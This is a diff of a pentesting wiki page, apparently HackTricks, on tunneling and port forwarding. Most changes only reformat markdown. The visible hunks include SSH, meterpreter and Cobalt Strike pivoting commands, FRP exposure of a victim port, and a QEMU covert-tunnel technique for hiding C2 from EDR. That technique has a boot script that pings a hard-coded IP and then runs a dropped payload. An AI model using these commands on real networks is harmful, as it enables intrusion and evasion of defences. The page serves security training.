@@ -1,11 +1,10 @@
 # Tunneling and Port Forwarding
 
-{{#include ../banners/hacktricks-training.md}}
+\{{#include ../banners/hacktricks-training.md\}}
 
 ## Nmap tip
 
-> [!WARNING]
-> **ICMP** and **SYN** scans cannot be tunnelled through socks proxies, so we must **disable ping discovery** (`-Pn`) and specify **TCP scans** (`-sT`) for this to work.
+> \[!WARNING] **ICMP** and **SYN** scans cannot be tunnelled through socks proxies, so we must **disable ping discovery** (`-Pn`) and specify **TCP scans** (`-sT`) for this to work.
 
 ## **Bash**
 
@@ -49,7 +48,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 
 ### Port2Port
 
-Local port --> Compromised host (SSH) --> Third_box:Port
+Local port --> Compromised host (SSH) --> Third\_box:Port
 
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
@@ -105,9 +104,8 @@ Set a new route on the client side
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 
-> [!NOTE]
-> **Security – Terrapin Attack (CVE-2023-48795)**  
-> The 2023 Terrapin downgrade attack can let a man-in-the-middle tamper with the early SSH handshake and inject data into **any forwarded channel** ( `-L`, `-R`, `-D` ). Ensure both client and server are patched (**OpenSSH ≥ 9.6/LibreSSH 6.7**) or explicitly disable the vulnerable `chacha20-poly1305@openssh.com` and `*-etm@openssh.com` algorithms in `sshd_config`/`ssh_config` before relying on SSH tunnels. 
+> \[!NOTE] **Security – Terrapin Attack (CVE-2023-48795)**\
+> The 2023 Terrapin downgrade attack can let a man-in-the-middle tamper with the early SSH handshake and inject data into **any forwarded channel** ( `-L`, `-R`, `-D` ). Ensure both client and server are patched (**OpenSSH ≥ 9.6/LibreSSH 6.7**) or explicitly disable the vulnerable `chacha20-poly1305@openssh.com` and `*-etm@openssh.com` algorithms in `sshd_config`/`ssh_config` before relying on SSH tunnels.
 
 ## SSHUTTLE
 
@@ -130,7 +128,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Local port --> Compromised host (active session) --> Third_box:Port
+Local port --> Compromised host (active session) --> Third\_box:Port
 
 ```bash
 # Inside a meterpreter session
@@ -178,8 +176,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 
 ### rPort2Port
 
-> [!WARNING]
-> In this case, the **port is opened in the beacon host**, not in the Team Server and the traffic is sent to the Team Server and from there to the indicated host:port
+> \[!WARNING] In this case, the **port is opened in the beacon host**, not in the Team Server and the traffic is sent to the Team Server and from there to the indicated host:port
 
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -188,14 +185,13 @@ rportfwd stop [bind port]
 
 To note:
 
-- Beacon's reverse port forward is designed to **tunnel traffic to the Team Server, not for relaying between individual machines**.
-- Traffic is **tunneled within Beacon's C2 traffic**, including P2P links.
-- **Admin privileges are not required** to create reverse port forwards on high ports.
+* Beacon's reverse port forward is designed to **tunnel traffic to the Team Server, not for relaying between individual machines**.
+* Traffic is **tunneled within Beacon's C2 traffic**, including P2P links.
+* **Admin privileges are not required** to create reverse port forwards on high ports.
 
 ### rPort2Port local
 
-> [!WARNING]
-> In this case, the **port is opened in the beacon host**, not in the Team Server and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port
+> \[!WARNING] In this case, the **port is opened in the beacon host**, not in the Team Server and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port
 
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
@@ -578,12 +574,12 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **is a tool to expose solutions to Internet in one command line.**\
-_Exposition URI are like:_ **UID.ngrok.io**
+&#xNAN;_&#x45;xposition URI are like:_ **UID.ngrok.io**
 
 ### Installation
 
-- Create an account: https://ngrok.com/signup
-- Client download:
+* Create an account: https://ngrok.com/signup
+* Client download:
 
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
@@ -633,8 +629,8 @@ Directly from stdout or in the HTTP interface [http://127.0.0.1:4040](http://127
 
 It opens 3 tunnels:
 
-- 2 TCP
-- 1 HTTP with static files exposition from /tmp/httpbin/
+* 2 TCP
+* 1 HTTP with static files exposition from /tmp/httpbin/
 
 ```yaml
 tunnels:
@@ -686,7 +682,7 @@ Start the connector:
 cloudflared tunnel run mytunnel
 ```
 
-Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible. 
+Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible.
 
 ## FRP (Fast Reverse Proxy)
 
@@ -724,11 +720,11 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
 
-The above command publishes the victim’s port **8080** as **attacker_ip:9000** without deploying any additional tooling – ideal for living-off-the-land pivoting. 
+The above command publishes the victim’s port **8080** as **attacker\_ip:9000** without deploying any additional tooling – ideal for living-off-the-land pivoting.
 
 ## Covert VM-based Tunnels with QEMU
 
-QEMU’s user-mode networking (`-netdev user`) supports an option called `hostfwd` that **binds a TCP/UDP port on the *host* and forwards it into the *guest***.  When the guest runs a full SSH daemon, the hostfwd rule gives you a disposable SSH jump box that lives entirely inside an ephemeral VM – perfect for hiding C2 traffic from EDR because all malicious activity and files stay in the virtual disk.
+QEMU’s user-mode networking (`-netdev user`) supports an option called `hostfwd` that **binds a TCP/UDP port on the&#x20;**_**host**_**&#x20;and forwards it into the&#x20;**_**guest**_. When the guest runs a full SSH daemon, the hostfwd rule gives you a disposable SSH jump box that lives entirely inside an ephemeral VM – perfect for hiding C2 traffic from EDR because all malicious activity and files stay in the virtual disk.
 
 ### Quick one-liner
 
@@ -742,8 +738,8 @@ qemu-system-x86_64.exe ^
    -nographic
 ```
 
-• The command above launches a **Tiny Core Linux** image (`tc.qcow2`) in RAM.  
-• Port **2222/tcp** on the Windows host is transparently forwarded to **22/tcp** inside the guest.  
+• The command above launches a **Tiny Core Linux** image (`tc.qcow2`) in RAM.\
+• Port **2222/tcp** on the Windows host is transparently forwarded to **22/tcp** inside the guest.\
 • From the attacker’s point of view the target simply exposes port 2222; any packets that reach it are handled by the SSH server running in the VM.
 
 ### Launching stealthily through VBScript
@@ -760,39 +756,36 @@ Running the script with `cscript.exe //B update.vbs` keeps the window hidden.
 
 Because Tiny Core is stateless, attackers usually:
 
-1. Drop payload to `/opt/123.out`  
-2. Append to `/opt/bootlocal.sh`:
+1. Drop payload to `/opt/123.out`
+2.  Append to `/opt/bootlocal.sh`:
 
-   ```sh
-   while ! ping -c1 45.77.4.101; do sleep 2; done
-   /opt/123.out
-   ```
-
+    ```sh
+    while ! ping -c1 45.77.4.101; do sleep 2; done
+    /opt/123.out
+    ```
 3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.
 
 ### Why this evades detection
 
-• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
-• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
+• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.\
+• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).\
 • Memory scanners never analyse the malicious process space because it lives in a different OS.
 
 ### Defender tips
 
-• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
-• Block outbound connections that originate from `qemu-system*.exe`.  
+• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.\
+• Block outbound connections that originate from `qemu-system*.exe`.\
 • Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.
 
----
+***
 
 ## Other tools to check
 
-- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
-- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
+* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 ## References
 
-- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+* [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
-{{#include ../banners/hacktricks-training.md}}
-
-
+\{{#include ../banners/hacktricks-training.md\}}
